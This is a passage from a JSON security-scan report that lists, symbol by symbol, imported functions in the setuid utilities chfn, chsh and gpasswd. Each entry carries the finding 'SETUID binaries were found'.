                  "details": "Offset: 0x0000dee0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dee8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000def0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000def8, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df00, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df08, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df18, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df20, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df28, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df30, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df38, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df40, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df48, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df50, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df58, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df60, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df68, Symbol: pam_acct_mgmt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df70, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df78, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df80, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df88, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df90, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000df98, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfa0, Symbol: pam_authenticate, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfa8, Symbol: putpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfb0, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfb8, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfc0, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dfe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000dff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000e120, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000eb88, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000eb90, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebc0, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebd0, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebd8, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebe0, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ebe8, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chfn",
                  "details": "Offset: 0x0000ec00, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x000032b0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc58, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc60, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc68, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc70, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc78, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc80, Symbol: pam_start, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc88, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc90, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cc98, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cca0, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cca8, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccb0, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccb8, Symbol: puts, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccc0, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccc8, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccd0, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccd8, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cce0, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cce8, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccf0, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ccf8, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd00, Symbol: __open_2, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd08, Symbol: fclose, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd10, Symbol: getpwuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd18, Symbol: bindtextdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd20, Symbol: dcgettext, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd28, Symbol: strlen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd30, Symbol: __lxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd38, Symbol: getpwuid_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd40, Symbol: pam_end, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd48, Symbol: chdir, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd50, Symbol: __stack_chk_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd58, Symbol: getuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd60, Symbol: getopt_long, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd68, Symbol: pam_strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd70, Symbol: strchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd78, Symbol: snprintf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd80, Symbol: audit_open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd88, Symbol: strrchr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd90, Symbol: __assert_fail, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cd98, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cda0, Symbol: memset, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cda8, Symbol: geteuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdb0, Symbol: setusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdb8, Symbol: selinux_set_callback, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdc0, Symbol: close, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdc8, Symbol: matchpathcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdd0, Symbol: fputc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdd8, Symbol: getusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cde0, Symbol: read, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cde8, Symbol: execve, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdf0, Symbol: calloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cdf8, Symbol: strcmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce00, Symbol: putc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce08, Symbol: signal, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce10, Symbol: strtoll, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce18, Symbol: __memcpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce20, Symbol: getprevcon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce28, Symbol: feof, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce30, Symbol: umask, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce38, Symbol: realpath, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce40, Symbol: getgrnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce48, Symbol: kill, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce50, Symbol: fileno, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce58, Symbol: getgid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce60, Symbol: __xstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce68, Symbol: setfscreatecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce70, Symbol: malloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce78, Symbol: fflush, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce80, Symbol: __vasprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce88, Symbol: __fxstat, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce90, Symbol: getlogin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ce98, Symbol: fseek, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cea0, Symbol: security_getenforce, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cea8, Symbol: __fgets_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ceb0, Symbol: __strncpy_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ceb8, Symbol: setrlimit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cec0, Symbol: setreuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cec8, Symbol: setregid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ced0, Symbol: realloc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000ced8, Symbol: fdopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cee0, Symbol: getpwnam_r, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cee8, Symbol: setlocale, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cef0, Symbol: __printf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cef8, Symbol: fchmod, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf00, Symbol: __syslog_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf08, Symbol: fsync, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf10, Symbol: waitpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf18, Symbol: open, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf20, Symbol: access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf28, Symbol: fchown, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf30, Symbol: audit_log_user_avc_message, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf38, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf40, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf48, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf50, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf58, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf60, Symbol: pam_acct_mgmt, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf68, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf70, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf78, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf80, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf88, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf90, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cf98, Symbol: pam_authenticate, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfa0, Symbol: putpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfa8, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfb0, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfb8, Symbol: endusershell, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfc0, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cfe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000cff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d0a0, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d5e8, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d5f0, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d620, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d630, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d638, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d640, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d648, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/chsh",
                  "details": "Offset: 0x0000d660, Symbol: stderr, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00000000, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d510, Symbol: setsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d550, Symbol: endsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d590, Symbol: sgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d740, Symbol: fgetsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d8b0, Symbol: getsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d8f0, Symbol: getsgnam, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x0000d930, Symbol: putsgent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014bd8, Symbol: __strcat_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014be0, Symbol: utime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014be8, Symbol: __snprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014bf0, Symbol: free, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014bf8, Symbol: is_selinux_enabled, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c00, Symbol: strcasecmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c08, Symbol: closelog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c10, Symbol: __errno_location, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c18, Symbol: srandom, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c20, Symbol: unlink, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c28, Symbol: strncpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c30, Symbol: strncmp, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c38, Symbol: _exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c40, Symbol: strcpy, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c48, Symbol: chroot, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c50, Symbol: puts, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c58, Symbol: ferror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c60, Symbol: lckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c68, Symbol: qsort, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c70, Symbol: isatty, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c78, Symbol: selinux_check_access, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c80, Symbol: fcntl, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c88, Symbol: write, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c90, Symbol: getpid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
                  "details": "Offset: 0x00014c98, Symbol: textdomain, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/gpasswd",
